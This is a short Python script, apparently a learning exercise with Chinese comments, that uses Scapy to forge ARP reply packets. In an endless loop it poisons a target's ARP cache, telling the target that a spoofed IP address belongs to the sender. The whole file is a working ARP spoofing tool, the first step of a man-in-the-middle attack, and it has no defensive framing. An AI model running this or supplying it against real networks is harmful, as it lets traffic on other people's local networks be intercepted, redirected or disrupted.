from scapy.all import *
import sys
import time
def arp_poison(target_ip, target_mac, spoof_ip):
    # op預設值為1，代表當我們創造一個ARP 封包時，會產生預設的ARP request，
    # 需要的是response，所以把default值改成op=2
    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(arp)
    return [arp.show(), arp.summary()]

while True:
    arp_poison(sys.argv[1], sys.argv[2], sys.argv[3])
    time.sleep(2)
